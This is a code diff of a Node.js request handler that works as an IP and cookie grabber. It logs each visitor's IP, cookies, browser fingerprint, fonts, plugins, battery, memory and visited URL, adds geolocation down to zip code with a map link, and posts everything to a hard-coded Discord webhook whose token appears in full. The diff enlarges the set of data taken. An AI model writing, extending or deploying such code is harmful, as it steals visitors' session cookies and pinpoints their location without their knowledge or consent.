@@ -7,14 +7,18 @@ module.exports = async (req, res) => {
     }
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
-    const data = req.body || {};
+    const clientData = req.body || {};
 
-    // Optional geo lookup
+    // Get geolocation
     let geo = {};
     try {
-        const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { timeout: 3000 });
-        if (geoRes.data.status === 'success') geo = geoRes.data;
-    } catch (e) {}
+        const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,timezone`, { timeout: 5000 });
+        if (geoRes.data.status === 'success') {
+            geo = geoRes.data;
+        }
+    } catch (e) {
+        console.error('Geo lookup failed:', e.message);
+    }
 
     // Build Discord embed
     const embed = {
@@ -22,20 +26,42 @@ module.exports = async (req, res) => {
         color: 0xff0044,
         fields: [
             { name: 'IP', value: ip, inline: true },
-            { name: 'User Agent', value: req.headers['user-agent'] || 'Unknown', inline: true },
-            { name: 'Screen', value: data.screen || 'Unknown', inline: true },
+            { name: 'User Agent', value: (req.headers['user-agent'] || 'Unknown').substring(0, 100), inline: true },
+            { name: 'Referer', value: (clientData.referrer || 'Direct').substring(0, 100), inline: true },
+            { name: 'Screen', value: clientData.screen || 'Unknown', inline: true },
+            { name: 'Platform', value: clientData.platform || 'Unknown', inline: true },
+            { name: 'Language', value: clientData.language || 'Unknown', inline: true },
+            { name: 'Timezone', value: clientData.timezone || 'Unknown', inline: true },
+            { name: 'Memory (GB)', value: clientData.memory || 'Unknown', inline: true },
+            { name: 'Battery', value: clientData.battery || 'Unknown', inline: true },
+            { name: 'Cookies', value: (clientData.cookies || 'none').substring(0, 200), inline: false },
+            { name: 'Plugins', value: (clientData.plugins || 'none').substring(0, 200), inline: false },
+            { name: 'Fonts', value: (clientData.fonts || 'none').substring(0, 200), inline: false },
+            { name: 'Fingerprint', value: (clientData.fingerprint || 'none').substring(0, 200), inline: false },
+            { name: 'URL', value: (clientData.url || 'Unknown').substring(0, 150), inline: false },
             { name: 'Time', value: new Date().toISOString(), inline: true },
         ],
+        timestamp: new Date().toISOString(),
     };
-    if (geo.country) embed.fields.push({ name: '📍 Location', value: `${geo.city}, ${geo.regionName}, ${geo.country}`, inline: false });
-    if (data.fingerprint) embed.fields.push({ name: '🔍 Fingerprint', value: data.fingerprint.substring(0, 200), inline: false });
-    if (data.cookies) embed.fields.push({ name: '🍪 Cookies', value: data.cookies.substring(0, 200), inline: false });
 
-    // Send to Discord webhook
+    if (geo.country) {
+        embed.fields.push({ name: '📍 Location', value: `${geo.city}, ${geo.regionName}, ${geo.country} (${geo.zip})`, inline: false });
+        if (geo.lat && geo.lon) {
+            embed.fields.push({ name: '🗺️ Map', value: `https://www.openstreetmap.org/?mlat=${geo.lat}&mlon=${geo.lon}&zoom=15`, inline: false });
+        }
+        if (geo.isp) {
+            embed.fields.push({ name: 'ISP', value: geo.isp, inline: true });
+        }
+        if (geo.org) {
+            embed.fields.push({ name: 'Organization', value: geo.org, inline: true });
+        }
+    }
+
+    // Send to Discord
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
     try {
         await axios.post(WEBHOOK_URL, { embeds: [embed] });
-        console.log(`[+] ${ip} logged`);
+        console.log(`[+] Data from ${ip} sent to Discord.`);
     } catch (e) {
         console.error('Webhook error:', e.message);
     }
